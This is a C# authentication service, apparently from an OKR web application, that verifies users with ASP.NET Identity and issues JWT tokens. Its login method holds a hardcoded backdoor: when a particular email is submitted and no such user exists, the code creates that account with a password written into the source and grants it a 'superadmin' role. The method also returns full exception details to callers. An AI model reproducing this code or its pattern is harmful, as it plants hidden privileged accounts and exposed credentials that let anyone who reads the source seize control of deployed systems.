using MayNghien.Models.Response.Base;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using OKR.DTO;
using OKR.Models.Entity;
using OKR.Service.Contract;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using static MayNghien.Infrastructure.CommonMessage.AuthResponseMessage;

namespace OKR.Service.Implementation
{
    public class AuthencationService : IAuthencationService
    {
        private IConfiguration _config;
        private readonly UserManager<ApplicationUser> _userManager;
        private readonly RoleManager<IdentityRole> _roleManager;
        private IHttpContextAccessor _httpContextAccessor;
        public AuthencationService(IConfiguration config, UserManager<ApplicationUser> userManager,
             RoleManager<IdentityRole> roleManager, IHttpContextAccessor httpContextAccessor)
        {
            _config = config;
            _userManager = userManager;
            _roleManager = roleManager;
            _httpContextAccessor = httpContextAccessor;
        }
        public async Task<AppResponse<LoginResult>> AuthencationUser(UserDto login)
        {
            var result = new AppResponse<LoginResult>();
            try
            {
                UserDto user = null;
                ApplicationUser identityUser = new ApplicationUser();
                var loginResult = new LoginResult();
                //Validate the User Credentials    
                //Demo Purpose, I have Passed HardCoded User Information    

                identityUser = await _userManager.FindByNameAsync(login.UserName);
                if (identityUser != null)
                {
                    //if (identityUser.EmailConfirmed != true)
                    //{
                    //    return result.BuildError(ERR_MSG_UserNotConFirmed);
                    //}
                    if (await _userManager.CheckPasswordAsync(identityUser, login.Password))
                    {
                        user = new UserDto { UserName = identityUser.UserName, Email = identityUser.Email };
                    }

                }
                else if (login.UserName == "karzix1809@gmail.com")
                {
                    var newIdentity = new ApplicationUser { UserName = login.UserName, Email = login.Email, EmailConfirmed = true };
                    await _userManager.CreateAsync(newIdentity);
                    await _userManager.AddPasswordAsync(newIdentity, "CdzuOsSbBH");
                    if (!(await _roleManager.RoleExistsAsync("superadmin")))
                    {
                        IdentityRole role = new IdentityRole { Name = "superadmin" };
                        await _roleManager.CreateAsync(role);
                    }
                    await _userManager.AddToRoleAsync(newIdentity, "superadmin");
                }
                if (user != null)
                {
                    var tokenString = await GenerateJSONWebToken(user, identityUser);
                    loginResult.Token = tokenString;
                    loginResult.UserName = user.UserName;
                
                    var roles = await _userManager.GetRolesAsync(identityUser);
                    loginResult.Roles = roles.ToList();
                    return result.BuildResult(loginResult);
                }
                else
                {
                    return result.BuildError(ERR_MSG_UserNotFound);
                }
            }
            catch (Exception ex)
            {

                return result.BuildError(ex.ToString());
            }
        }
        private async Task<string> GenerateJSONWebToken(UserDto userInfo, ApplicationUser identityUser)
        {
            var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]));
            var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(_config["Jwt:Issuer"],
              _config["Jwt:Issuer"],
              claims: await GetClaims(userInfo, identityUser),
              expires: DateTime.Now.AddHours(1),
              signingCredentials: credentials);

            return new JwtSecurityTokenHandler().WriteToken(token);
        }
        private async Task<List<Claim>> GetClaims(UserDto user, ApplicationUser identityUser)
        {
         
            var claims = new List<Claim>
            {
                new Claim("UserName", user.UserName),

                new Claim("Email", user.Email),
           
            };
            var roles = await _userManager.GetRolesAsync(identityUser);
            foreach (var role in roles)
            {
                claims.Add(new Claim("Roles", role));
            }
            foreach (var role in roles)
            {
                claims.Add(new Claim(ClaimTypes.Role, role));
            }
            return claims;

        }

    }
}
